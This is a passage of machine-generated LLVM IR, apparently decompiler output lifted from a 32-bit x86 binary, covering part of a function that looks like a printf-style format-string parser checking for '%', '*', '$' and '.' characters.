  %v2_804f283 = load i8, i8* %v1_804f283, align 1
  %v15_804f283 = icmp eq i8 %v2_804f283, %v2_804f280
  %v1_804f285 = icmp eq i1 %v15_804f283, false
  br i1 %v1_804f285, label %dec_label_pc_804f28c, label %dec_label_pc_804f287

dec_label_pc_804f287:                             ; preds = %dec_label_pc_804f280
  %v1_804f287 = add i32 %v0_804f2a2, 1
  store i32 %v1_804f287, i32* @esi, align 4
  %v0_804f288 = load i32, i32* %edi.global-to-local, align 4
  %v2_804f288 = or i32 %v0_804f288, %v0_804f291
  store i32 %v2_804f288, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f276

dec_label_pc_804f28c:                             ; preds = %dec_label_pc_804f280
  %v1_804f28c = inttoptr i32 %v1_804f282 to i8*
  %v2_804f28c = load i8, i8* %v1_804f28c, align 1
  %v3_804f28c = icmp eq i8 %v2_804f28c, 0
  br i1 %v3_804f28c, label %dec_label_pc_804f295, label %dec_label_pc_804f291

dec_label_pc_804f291:                             ; preds = %dec_label_pc_804f28c
  %v2_804f291 = mul i32 %v0_804f291, 2
  br label %dec_label_pc_804f280

dec_label_pc_804f295:                             ; preds = %dec_label_pc_804f28c
  %v0_804f295 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804f299 = udiv i32 %v0_804f295, 2
  %v1_804f299.not = or i32 %v1_804f299, -6
  %v1_804f29e = xor i32 %v1_804f299.not, 5
  store i32 %v1_804f29e, i32* %eax.global-to-local, align 4
  %v2_804f2a0 = and i32 %v1_804f29e, %v0_804f295
  store i32 %v2_804f2a0, i32* %edi.global-to-local, align 4
  %v1_804f2a2 = add i32 %v0_804f2a2, -1
  %v2_804f2a2 = inttoptr i32 %v1_804f2a2 to i8*
  %v3_804f2a2 = load i8, i8* %v2_804f2a2, align 1
  %v12_804f2a2 = icmp eq i8 %v3_804f2a2, 37
  %v1_804f2a6 = icmp eq i1 %v12_804f2a2, false
  br i1 %v1_804f2a6, label %dec_label_pc_804f1d8, label %dec_label_pc_804f2ac

dec_label_pc_804f2ac:                             ; preds = %dec_label_pc_804f267, %dec_label_pc_804f295, %dec_label_pc_804f215, %dec_label_pc_804f25a
  %v0_804f2cf = phi i32 [ %v1_804f201, %dec_label_pc_804f25a ], [ %v1_804f201, %dec_label_pc_804f267 ], [ 0, %dec_label_pc_804f295 ], [ %v1_804f201, %dec_label_pc_804f215 ]
  %v1_804f2d8 = phi i32 [ %v0_804f208, %dec_label_pc_804f25a ], [ %v0_804f208, %dec_label_pc_804f267 ], [ %v0_804f2a2, %dec_label_pc_804f295 ], [ %v0_804f208, %dec_label_pc_804f215 ]
  %v0_804f2d5 = phi i32 [ %v0_804f215, %dec_label_pc_804f25a ], [ %v0_804f215, %dec_label_pc_804f267 ], [ %v1_804f282, %dec_label_pc_804f295 ], [ %v0_804f215, %dec_label_pc_804f215 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804f25a ], [ %stack_var_-32.1, %dec_label_pc_804f267 ], [ %stack_var_-32.2, %dec_label_pc_804f295 ], [ %stack_var_-32.1, %dec_label_pc_804f215 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804f25a ], [ 0, %dec_label_pc_804f267 ], [ %stack_var_-88.2, %dec_label_pc_804f295 ], [ %stack_var_-88.1, %dec_label_pc_804f215 ]
  %v1_804f2ac = inttoptr i32 %v0_804f2d5 to i8*
  %v2_804f2ac = load i8, i8* %v1_804f2ac, align 1
  %v11_804f2ac = icmp eq i8 %v2_804f2ac, 42
  %v1_804f2af = icmp eq i1 %v11_804f2ac, false
  br i1 %v1_804f2af, label %dec_label_pc_804f2e5, label %dec_label_pc_804f2b1

dec_label_pc_804f2b1:                             ; preds = %dec_label_pc_804f2ac
  %v4_804f2b1 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804f2b1, label %dec_label_pc_804f2d5, label %dec_label_pc_804f2b8

dec_label_pc_804f2b8:                             ; preds = %dec_label_pc_804f2b1
  %v1_804f2b8 = inttoptr i32 %v1_804f2d8 to i8*
  %v2_804f2b8 = load i8, i8* %v1_804f2b8, align 1
  %v11_804f2b8 = icmp eq i8 %v2_804f2b8, 36
  %v1_804f2bb = icmp eq i1 %v11_804f2b8, false
  br i1 %v1_804f2bb, label %dec_label_pc_804f4fd, label %dec_label_pc_804f2c1

dec_label_pc_804f2c1:                             ; preds = %dec_label_pc_804f2b8
  %tmp91 = icmp slt i32 %v0_804f2cf, 1
  br i1 %tmp91, label %dec_label_pc_804f4fd, label %dec_label_pc_804f2c9

dec_label_pc_804f2c9:                             ; preds = %dec_label_pc_804f2c1
  store i32 %v8_804f1df, i32* %eax.global-to-local, align 4
  %v1_804f2ce = add i32 %v1_804f2d8, 1
  store i32 %v1_804f2ce, i32* @esi, align 4
  %v1_804f2cf = load i32, i32* @esp, align 4
  %v3_804f2cf = add i32 %v8_804f1df, 68
  %v4_804f2cf = add i32 %v3_804f2cf, %v1_804f2cf
  %v5_804f2cf = inttoptr i32 %v4_804f2cf to i32*
  store i32 %v0_804f2cf, i32* %v5_804f2cf, align 4
  %v0_804f313.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f2e0

dec_label_pc_804f2d5:                             ; preds = %dec_label_pc_804f2b1
  %v1_804f2d5 = add i32 %v0_804f2d5, 1
  store i32 %v1_804f2d5, i32* %eax.global-to-local, align 4
  %v12_804f2d8 = icmp eq i32 %v1_804f2d5, %v1_804f2d8
  %v1_804f2da = icmp eq i1 %v12_804f2d8, false
  br i1 %v1_804f2da, label %dec_label_pc_804f4fd, label %dec_label_pc_804f2e0

dec_label_pc_804f2e0:                             ; preds = %dec_label_pc_804f2d5, %dec_label_pc_804f2c9
  %v0_804f313.pre.pre.pre = phi i32 [ %v1_804f2d8, %dec_label_pc_804f2d5 ], [ %v0_804f313.pre.pre.pre.pre, %dec_label_pc_804f2c9 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f2e5

dec_label_pc_804f2e5:                             ; preds = %dec_label_pc_804f2ac, %dec_label_pc_804f2e0
  %v0_804f313.pre.pre = phi i32 [ %v1_804f2d8, %dec_label_pc_804f2ac ], [ %v0_804f313.pre.pre.pre, %dec_label_pc_804f2e0 ]
  %v0_804f17e = phi i32 [ %v0_804f2cf, %dec_label_pc_804f2ac ], [ -2147483648, %dec_label_pc_804f2e0 ]
  %v4_804f2e5 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804f2e5 = icmp eq i32 %v4_804f2e5, 0
  %v1_804f2ea = icmp eq i1 %v5_804f2e5, false
  %.pre = inttoptr i32 %v0_804f313.pre.pre to i8*
  br i1 %v1_804f2ea, label %dec_label_pc_804f30e, label %dec_label_pc_804f2f0

dec_label_pc_804f2f0:                             ; preds = %dec_label_pc_804f2e5
  %v2_804f2f0 = load i8, i8* %.pre, align 1
  %v11_804f2f0 = icmp eq i8 %v2_804f2f0, 46
  %v1_804f2f3 = icmp eq i1 %v11_804f2f0, false
  br i1 %v1_804f2f3, label %dec_label_pc_804f307, label %dec_label_pc_804f2f5

dec_label_pc_804f2f5:                             ; preds = %dec_label_pc_804f2f0
  %v1_804f2f5 = add i32 %v0_804f313.pre.pre, 1
  store i32 %v1_804f2f5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1d8.outer

dec_label_pc_804f307:                             ; preds = %dec_label_pc_804f2f0
  br label %dec_label_pc_804f30e

dec_label_pc_804f30e:                             ; preds = %dec_label_pc_804f2e5, %dec_label_pc_804f307
  %stack_var_-96.2 = phi i32 [ %v0_804f17e, %dec_label_pc_804f307 ], [ %stack_var_-96.1.ph, %dec_label_pc_804f2e5 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804f307 ], [ %v0_804f17e, %dec_label_pc_804f2e5 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8053678.108 to i32), i32* @edx, align 4
  %v4_804f313.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f313

dec_label_pc_804f313:                             ; preds = %dec_label_pc_804f31d, %dec_label_pc_804f30e
  %v0_804f31d = phi i32 [ %v1_804f31d, %dec_label_pc_804f31d ], [ ptrtoint ([9 x i8]* @global_var_8053678.108 to i32), %dec_label_pc_804f30e ]
  %v4_804f313 = phi i32 [ %v6_804f313, %dec_label_pc_804f31d ], [ %v4_804f313.pre, %dec_label_pc_804f30e ]
  %v2_804f313 = load i8, i8* %.pre, align 1
  %v3_804f313 = zext i8 %v2_804f313 to i32
  %v5_804f313 = and i32 %v4_804f313, -256
  %v6_804f313 = or i32 %v3_804f313, %v5_804f313
  store i32 %v6_804f313, i32* %eax.global-to-local, align 4
  %v3_804f315 = inttoptr i32 %v0_804f31d to i8*
  %v4_804f315 = load i8, i8* %v3_804f315, align 1
  %v15_804f315 = icmp eq i8 %v2_804f313, %v4_804f315
  br i1 %v15_804f315, label %dec_label_pc_804f185, label %dec_label_pc_804f31d

dec_label_pc_804f31d:                             ; preds = %dec_label_pc_804f313
  %v1_804f31d = add i32 %v0_804f31d, 1
  store i32 %v1_804f31d, i32* @edx, align 4
  %v1_804f31e = inttoptr i32 %v1_804f31d to i8*
  %v2_804f31e = load i8, i8* %v1_804f31e, align 1
  %v3_804f31e = icmp eq i8 %v2_804f31e, 0
  %v1_804f321 = icmp eq i1 %v3_804f31e, false
  br i1 %v1_804f321, label %dec_label_pc_804f313, label %dec_label_pc_804f323

dec_label_pc_804f323:                             ; preds = %dec_label_pc_804f31d, %dec_label_pc_804f185
  %v0_804f336 = phi i32 [ %v1_804f185, %dec_label_pc_804f185 ], [ %v0_804f313.pre.pre, %dec_label_pc_804f31d ]
  %v0_804f333 = phi i32 [ %v0_804f31d, %dec_label_pc_804f185 ], [ %v1_804f31d, %dec_label_pc_804f31d ]
  %v1_804f325 = add i32 %v0_804f333, -134559352
  %v1_804f32a = add i32 %v0_804f333, -134559353
  %v5_804f32a = sub i32 134559352, %v0_804f333
  %v6_804f32a = and i32 %v1_804f325, %v5_804f32a
  %v7_804f32a = icmp slt i32 %v6_804f32a, 0
  %v8_804f32a = icmp eq i32 %v1_804f32a, 0
  %v9_804f32a = icmp slt i32 %v1_804f32a, 0
  store i32 %v1_804f32a, i32* %eax.global-to-local, align 4
  %v3_804f32b = icmp eq i1 %v9_804f32a, %v7_804f32a
  %v4_804f32b = icmp eq i1 %v8_804f32a, false
  %v5_804f32b = and i1 %v4_804f32b, %v3_804f32b
  br i1 %v5_804f32b, label %dec_label_pc_804f337, label %dec_label_pc_804f32d

dec_label_pc_804f32d:                             ; preds = %dec_label_pc_804f323
  %v1_804f32d = inttoptr i32 %v0_804f336 to i8*
  %v2_804f32d = load i8, i8* %v1_804f32d, align 1
  %v3_804f32d = zext i8 %v2_804f32d to i32
  %v5_804f32d = and i32 %v1_804f32a, -256
  %v6_804f32d = or i32 %v3_804f32d, %v5_804f32d
  store i32 %v6_804f32d, i32* %eax.global-to-local, align 4
  %v3_804f32f = inttoptr i32 %v0_804f333 to i8*
  %v4_804f32f = load i8, i8* %v3_804f32f, align 1
  %v15_804f32f = icmp eq i8 %v2_804f32d, %v4_804f32f
  %v1_804f331 = icmp eq i1 %v15_804f32f, false
  br i1 %v1_804f331, label %dec_label_pc_804f337, label %dec_label_pc_804f333

dec_label_pc_804f333:                             ; preds = %dec_label_pc_804f32d
  %v1_804f333 = add i32 %v0_804f333, 9
  store i32 %v1_804f333, i32* @edx, align 4
  %v1_804f336 = add i32 %v0_804f336, 1
  store i32 %v1_804f336, i32* @esi, align 4
  br label %dec_label_pc_804f337

dec_label_pc_804f337:                             ; preds = %dec_label_pc_804f32d, %dec_label_pc_804f323, %dec_label_pc_804f333
  %v4_804f33b = phi i32 [ %v6_804f32d, %dec_label_pc_804f32d ], [ %v1_804f32a, %dec_label_pc_804f323 ], [ %v6_804f32d, %dec_label_pc_804f333 ]
  %v0_804f33b = phi i32 [ %v0_804f336, %dec_label_pc_804f32d ], [ %v0_804f336, %dec_label_pc_804f323 ], [ %v1_804f336, %dec_label_pc_804f333 ]
  %v0_804f337 = phi i32 [ %v0_804f333, %dec_label_pc_804f32d ], [ %v0_804f333, %dec_label_pc_804f323 ], [ %v1_804f333, %dec_label_pc_804f333 ]
  %v1_804f337 = add i32 %v0_804f337, 9
  %v2_804f337 = inttoptr i32 %v1_804f337 to i8*
  %v3_804f337 = load i8, i8* %v2_804f337, align 1
  %v4_804f337 = sext i8 %v3_804f337 to i32
  store i32 %v4_804f337, i32* %ebx.global-to-local, align 4
  %v1_804f33b = inttoptr i32 %v0_804f33b to i8*
  %v2_804f33b = load i8, i8* %v1_804f33b, align 1
  %v3_804f33b = zext i8 %v2_804f33b to i32
  %v5_804f33b = and i32 %v4_804f33b, -256
  %v6_804f33b = or i32 %v3_804f33b, %v5_804f33b
  store i32 %v6_804f33b, i32* %eax.global-to-local, align 4
  %v2_804f33d = mul nsw i32 %v4_804f337, 256
  store i32 %v2_804f33d, i32* %ebx.global-to-local, align 4
  %v4_804f340 = icmp eq i8 %v2_804f33b, 0
  br i1 %v4_804f340, label %dec_label_pc_804f4fd, label %dec_label_pc_804f348

dec_label_pc_804f348:                             ; preds = %dec_label_pc_804f337
  %v3_804f348 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f348, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_80536b5.109 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f351

dec_label_pc_804f351:                             ; preds = %dec_label_pc_804f3a1, %dec_label_pc_804f348
  %v0_804f3a1 = phi i32 [ %v1_804f3a1, %dec_label_pc_804f3a1 ], [ ptrtoint ([21 x i8]* @global_var_80536b5.109 to i32), %dec_label_pc_804f348 ]
  %v3_804f351 = inttoptr i32 %v0_804f3a1 to i8*
  %v4_804f351 = load i8, i8* %v3_804f351, align 1
  %v15_804f351 = icmp eq i8 %v2_804f33b, %v4_804f351
  %v1_804f353 = icmp eq i1 %v15_804f351, false
  br i1 %v1_804f353, label %dec_label_pc_804f3a1, label %dec_label_pc_804f355

dec_label_pc_804f355:                             ; preds = %dec_label_pc_804f351
  %v1_804f357 = add i32 %v0_804f3a1, -134559413
  store i32 %v1_804f357, i32* %edx.global-to-local, align 4
  %v7_804f360 = icmp sgt i32 %v1_804f357, 17
  br i1 %v7_804f360, label %dec_label_pc_804f362, label %dec_label_pc_804f36b

dec_label_pc_804f362:                             ; preds = %dec_label_pc_804f355
  %v1_804f362 = add i32 %v0_804f3a1, -134559415
  store i32 %v1_804f362, i32* %eax.global-to-local, align 4
  %v3_804f365 = and i32 %v2_804f33d, 1024
  %v4_804f365 = icmp eq i32 %v3_804f365, 0
  %v1_804f368 = icmp eq i1 %v4_804f365, false
  %v4_804f368 = select i1 %v1_804f368, i32 %v1_804f362, i32 %v1_804f357
  store i32 %v4_804f368, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f36b

dec_label_pc_804f36b:                             ; preds = %dec_label_pc_804f355, %dec_label_pc_804f362
  %v0_804f374 = phi i32 [ %v1_804f357, %dec_label_pc_804f355 ], [ %v4_804f368, %dec_label_pc_804f362 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80536ab.110 to i32), i32* %ecx.global-to-local, align 4
  %v2_804f374 = add i32 %tmp76, 32
  %v3_804f374 = inttoptr i32 %v2_804f374 to i32*
  store i32 %v0_804f374, i32* %v3_804f374, align 4
  %v0_804f377.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804f37b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f377

dec_label_pc_804f377:                             ; preds = %dec_label_pc_804f377, %dec_label_pc_804f36b
  %v0_804f377 = phi i32 [ %v1_804f377, %dec_label_pc_804f377 ], [ %v0_804f377.pre, %dec_label_pc_804f36b ]
  %v1_804f377 = add i32 %v0_804f377, 1
  store i32 %v1_804f377, i32* %ecx.global-to-local, align 4
  %v1_804f378 = inttoptr i32 %v1_804f377 to i8*
  %v2_804f378 = load i8, i8* %v1_804f378, align 1
  %v3_804f378 = sext i8 %v2_804f378 to i32
  store i32 %v3_804f378, i32* %eax.global-to-local, align 4
  %v8_804f37d = icmp sgt i32 %v0_804f37b.pre, %v3_804f378
  br i1 %v8_804f37d, label %dec_label_pc_804f377, label %dec_label_pc_804f37f

dec_label_pc_804f37f:                             ; preds = %dec_label_pc_804f377
  store i32 ptrtoint ([21 x i8]* @global_var_80536b5.109 to i32), i32* @ecx, align 4
  %v1_804f386 = add i32 %v0_804f377, -134559403
  store i32 %v1_804f386, i32* %eax.global-to-local, align 4
  %v2_804f38b = add i32 %v0_804f377, add (i32 ptrtoint (i32* @global_var_805369c.111 to i32), i32 -134559403)
  %v3_804f38b = add i32 %v2_804f38b, %v1_804f386
  %v4_804f38b = inttoptr i32 %v3_804f38b to i16*
  %v5_804f38b = load i16, i16* %v4_804f38b, align 2
  %v6_804f38b = sext i16 %v5_804f38b to i32
  store i32 %v6_804f38b, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804f386, 2
  %v3_804f393 = add i32 %factor, 134559372
  %v4_804f393 = inttoptr i32 %v3_804f393 to i16*
  %v5_804f393 = load i16, i16* %v4_804f393, align 2
  %v6_804f393 = sext i16 %v5_804f393 to i32
  store i32 %v6_804f393, i32* %eax.global-to-local, align 4
  %v1_804f39b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f39b = or i32 %v1_804f39b, %v6_804f38b
  %v2_804f39d = and i32 %v2_804f39b, %v6_804f393
  store i32 %v2_804f39d, i32* %edx.global-to-local, align 4
  %v0_804f3af.pre = load i32, i32* @esi, align 4
  %v0_804f3b2.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f3a7

dec_label_pc_804f3a1:                             ; preds = %dec_label_pc_804f351
  %v1_804f3a1 = add i32 %v0_804f3a1, 1
  store i32 %v1_804f3a1, i32* @ecx, align 4
  %v1_804f3a2 = inttoptr i32 %v1_804f3a1 to i8*
  %v2_804f3a2 = load i8, i8* %v1_804f3a2, align 1
  %v3_804f3a2 = icmp eq i8 %v2_804f3a2, 0
  %v1_804f3a5 = icmp eq i1 %v3_804f3a2, false
  br i1 %v1_804f3a5, label %dec_label_pc_804f351, label %dec_label_pc_804f3a7

dec_label_pc_804f3a7:                             ; preds = %dec_label_pc_804f3a1, %dec_label_pc_804f37f
  %v0_804f3b2 = phi i32 [ %v0_804f3b2.pre, %dec_label_pc_804f37f ], [ %storemerge4, %dec_label_pc_804f3a1 ]
  %v0_804f3af = phi i32 [ %v0_804f3af.pre, %dec_label_pc_804f37f ], [ %v0_804f33b, %dec_label_pc_804f3a1 ]
  %v0_804f3a7 = phi i32 [ %v2_804f39d, %dec_label_pc_804f37f ], [ %v3_804f348, %dec_label_pc_804f3a1 ]
  store i32 %v0_804f3a7, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f3af = inttoptr i32 %v0_804f3af to i8*
  %v2_804f3af = load i8, i8* %v1_804f3af, align 1
  %v3_804f3af = sext i8 %v2_804f3af to i32
  store i32 %v3_804f3af, i32* %eax.global-to-local, align 4
  %v2_804f3b2 = add i32 %tmp76, 4
  %v3_804f3b2 = inttoptr i32 %v2_804f3b2 to i32*
  store i32 %v0_804f3b2, i32* %v3_804f3b2, align 4
  %v0_804f3b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3b5 = load i32, i32* @edx, align 4
  %v2_804f3b5 = add i32 %v1_804f3b5, 12
  %v3_804f3b5 = inttoptr i32 %v2_804f3b5 to i32*
  store i32 %v0_804f3b5, i32* %v3_804f3b5, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804f3bc = load i32, i32* @edx, align 4
  %v1_804f3bc = add i32 %v0_804f3bc, 28
  %v2_804f3bc = inttoptr i32 %v1_804f3bc to i32*
  store i32 1, i32* %v2_804f3bc, align 4
  %v0_804f3c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3c3 = load i32, i32* @edx, align 4
  %v2_804f3c3 = add i32 %v1_804f3c3, 8
  %v3_804f3c3 = inttoptr i32 %v2_804f3c3 to i32*
  store i32 %v0_804f3c3, i32* %v3_804f3c3, align 4
  %v0_804f3c6 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f3d0 = and i32 %v0_804f3c6, -5
  %v0_804f3d6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f3d6 = and i32 %v0_804f3d6, 3840
  store i32 %v1_804f3d6, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804f3df = or i32 %v1_804f3d6, %v1_804f3d0
  store i32 %v2_804f3df, i32* @edi, align 4
  %v1_804f3e1 = load i32, i32* @edx, align 4
  %v2_804f3e1 = add i32 %v1_804f3e1, 20
  %v3_804f3e1 = inttoptr i32 %v2_804f3e1 to i32*
  store i32 48, i32* %v3_804f3e1, align 4
  %v0_804f3e4 = load i32, i32* @edi, align 4
  %v1_804f3e4 = load i32, i32* @edx, align 4
  %v2_804f3e4 = add i32 %v1_804f3e4, 16
  %v3_804f3e4 = inttoptr i32 %v2_804f3e4 to i32*
  store i32 %v0_804f3e4, i32* %v3_804f3e4, align 4
  %v0_804f3e7 = load i32, i32* @ecx, align 4
  %v1_804f3e7 = inttoptr i32 %v0_804f3e7 to i8*
  %v2_804f3e7 = load i8, i8* %v1_804f3e7, align 1
  %v3_804f3e7 = icmp eq i8 %v2_804f3e7, 0
  %v1_804f3ea = icmp eq i1 %v3_804f3e7, false
  br i1 %v1_804f3ea, label %dec_label_pc_804f403, label %dec_label_pc_804f3ec

dec_label_pc_804f3ec:                             ; preds = %dec_label_pc_804f3a7
  %v0_804f3ec = load i32, i32* @esi, align 4
  %v1_804f3ec = inttoptr i32 %v0_804f3ec to i8*
  %v2_804f3ec = load i8, i8* %v1_804f3ec, align 1
  %v11_804f3ec = icmp eq i8 %v2_804f3ec, 109
  %v1_804f3ef = icmp eq i1 %v11_804f3ec, false
  br i1 %v1_804f3ef, label %dec_label_pc_804f4fd, label %dec_label_pc_804f3f5

dec_label_pc_804f3f5:                             ; preds = %dec_label_pc_804f3ec
  %v0_804f3f5 = load i32, i32* @edx, align 4
  %v1_804f3f5 = add i32 %v0_804f3f5, 32
  %v2_804f3f5 = inttoptr i32 %v1_804f3f5 to i32*
  store i32 20, i32* %v2_804f3f5, align 4
  %v0_804f3fc = load i32, i32* @edx, align 4
  %v1_804f3fc = add i32 %v0_804f3fc, 28
  %v2_804f3fc = inttoptr i32 %v1_804f3fc to i32*
  store i32 0, i32* %v2_804f3fc, align 4
  br label %dec_label_pc_804f403

dec_label_pc_804f403:                             ; preds = %dec_label_pc_804f3a7, %dec_label_pc_804f3f5
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804f49f, label %dec_label_pc_804f40e

dec_label_pc_804f40e:                             ; preds = %dec_label_pc_804f403
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804f487 = add i32 %tmp76, 40
  %v4_804f41d = add i32 %tmp76, 36
  %v1_804f490 = add i32 %tmp76, 28
  %v2_804f490 = inttoptr i32 %v1_804f490 to i32*
  br label %dec_label_pc_804f410

dec_label_pc_804f410:                             ; preds = %dec_label_pc_804f48b, %dec_label_pc_804f40e
  %v0_804f426 = phi i32 [ 0, %dec_label_pc_804f40e ], [ %v1_804f48f, %dec_label_pc_804f48b ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f40e ], [ %stack_var_-88.5, %dec_label_pc_804f48b ]
  %v1_804f410 = add i32 %v0_804f426, -2
  %v6_804f410 = sub i32 1, %v0_804f426
  %v7_804f410 = and i32 %v6_804f410, %v0_804f426
  %v8_804f410 = icmp slt i32 %v7_804f410, 0
  %v9_804f410 = icmp eq i32 %v1_804f410, 0
  %v10_804f410 = icmp slt i32 %v1_804f410, 0
  %v3_804f413 = icmp eq i1 %v10_804f410, %v8_804f410
  %v4_804f413 = icmp eq i1 %v9_804f410, false
  %v5_804f413 = and i1 %v4_804f413, %v3_804f413
  br i1 %v5_804f413, label %dec_label_pc_804f426, label %dec_label_pc_804f415

dec_label_pc_804f415:                             ; preds = %dec_label_pc_804f410
  %v0_804f415 = load i32, i32* @esp, align 4
  %v2_804f415 = mul i32 %v0_804f426, 4
  %v3_804f415 = add i32 %v2_804f415, 68
  %v4_804f415 = add i32 %v3_804f415, %v0_804f415
  %v5_804f415 = inttoptr i32 %v4_804f415 to i32*
  %v6_804f415 = load i32, i32* %v5_804f415, align 4
  store i32 %v6_804f415, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f41d = trunc i32 %v6_804f415 to i8
  %v5_804f41d = add i32 %v4_804f41d, %v0_804f426
  %v6_804f41d = inttoptr i32 %v5_804f41d to i8*
  store i8 %v1_804f41d, i8* %v6_804f41d, align 1
  %v0_804f421 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f421 = urem i32 %v0_804f421, 256
  br label %dec_label_pc_804f42f

dec_label_pc_804f426:                             ; preds = %dec_label_pc_804f410
  %v5_804f428 = add i32 %v0_804f426, %stack_var_-32.3
  store i32 %v5_804f428, i32* %eax.global-to-local, align 4
  %v1_804f42c = add i32 %v5_804f428, -2
  br label %dec_label_pc_804f42f

dec_label_pc_804f42f:                             ; preds = %dec_label_pc_804f415, %dec_label_pc_804f426
  %v0_804f442 = phi i32 [ %v1_804f421, %dec_label_pc_804f415 ], [ %v1_804f42c, %dec_label_pc_804f426 ]
  store i32 %v0_804f442, i32* %eax.global-to-local, align 4
  %v5_804f42f = sub i32 %v0_804f442, %stack_var_-88.4
  %v11_804f42f = xor i32 %v0_804f442, %stack_var_-88.4
  %v12_804f42f = xor i32 %v5_804f42f, %v0_804f442
  %v13_804f42f = and i32 %v12_804f42f, %v11_804f42f
  %v14_804f42f = icmp slt i32 %v13_804f42f, 0
  %v15_804f42f = icmp eq i32 %v5_804f42f, 0
  %v16_804f42f = icmp slt i32 %v5_804f42f, 0
  %v3_804f433 = icmp ne i1 %v16_804f42f, %v14_804f42f
  %v4_804f433 = or i1 %v15_804f42f, %v3_804f433
  br i1 %v4_804f433, label %dec_label_pc_804f442, label %dec_label_pc_804f435

dec_label_pc_804f435:                             ; preds = %dec_label_pc_804f42f
  %v1_804f435 = add i32 %v0_804f442, -9
  %v6_804f435 = sub i32 8, %v0_804f442
  %v7_804f435 = and i32 %v6_804f435, %v0_804f442
  %v8_804f435 = icmp slt i32 %v7_804f435, 0
  %v9_804f435 = icmp eq i32 %v1_804f435, 0
  %v10_804f435 = icmp slt i32 %v1_804f435, 0
  %v3_804f438 = icmp eq i1 %v10_804f435, %v8_804f435
  %v4_804f438 = icmp eq i1 %v9_804f435, false
  %v5_804f438 = and i1 %v4_804f438, %v3_804f438
  br i1 %v5_804f438, label %dec_label_pc_804f4fd, label %dec_label_pc_804f442

dec_label_pc_804f442:                             ; preds = %dec_label_pc_804f435, %dec_label_pc_804f42f
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804f42f ], [ %v0_804f442, %dec_label_pc_804f435 ]
  %v1_804f442 = add i32 %v0_804f442, -1
  store i32 %v1_804f442, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804f44b = load i32, i32* @esp, align 4
  %v1_804f44b = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f44b = mul i32 %v1_804f44b, 4
  %v3_804f44b = add i32 %v0_804f44b, 80
  %v4_804f44b = add i32 %v3_804f44b, %v2_804f44b
  %v5_804f44b = inttoptr i32 %v4_804f44b to i32*
  %v6_804f44b = load i32, i32* %v5_804f44b, align 4
  store i32 %v6_804f44b, i32* %edi.global-to-local, align 4
  %v2_804f44f = mul i32 %v1_804f442, 4
  %v4_804f44f = add i32 %v4_804f487, %v2_804f44f
  %v5_804f44f = inttoptr i32 %v4_804f44f to i32*
  %v6_804f44f = load i32, i32* %v5_804f44f, align 4
  store i32 %v6_804f44f, i32* @eax, align 4
  %v9_804f453 = icmp eq i32 %v6_804f44b, 8
  br i1 %v9_804f453, label %dec_label_pc_804f48b, label %dec_label_pc_804f458

dec_label_pc_804f458:                             ; preds = %dec_label_pc_804f442
  %v9_804f458 = icmp eq i32 %v6_804f44f, 8
  br i1 %v9_804f458, label %dec_label_pc_804f47b, label %dec_label_pc_804f45d

dec_label_pc_804f45d:                             ; preds = %dec_label_pc_804f458
  %v12_804f45d = icmp eq i32 %v6_804f44f, %v6_804f44b
  br i1 %v12_804f45d, label %dec_label_pc_804f47b, label %dec_label_pc_804f461

dec_label_pc_804f461:                             ; preds = %dec_label_pc_804f45d
  %v1_804f461 = call i32 @_promoted_size(i32 %v1_804f442)
  store i32 %v1_804f461, i32* %ebx.global-to-local, align 4
  %v0_804f468 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f468, i32* @eax, align 4
  %v1_804f46a = call i32 @_promoted_size(i32 %v1_804f442)
  %v2_804f46f = sub i32 %v1_804f461, %v1_804f46a
  %v8_804f46f = xor i32 %v1_804f461, %v1_804f46a
  %v9_804f46f = xor i32 %v2_804f46f, %v1_804f461
  %v10_804f46f = and i32 %v9_804f46f, %v8_804f46f
  %v11_804f46f = icmp slt i32 %v10_804f46f, 0
  %v12_804f46f = icmp eq i32 %v2_804f46f, 0
  %v13_804f46f = icmp slt i32 %v2_804f46f, 0
  %v3_804f471 = icmp ne i1 %v13_804f46f, %v11_804f46f
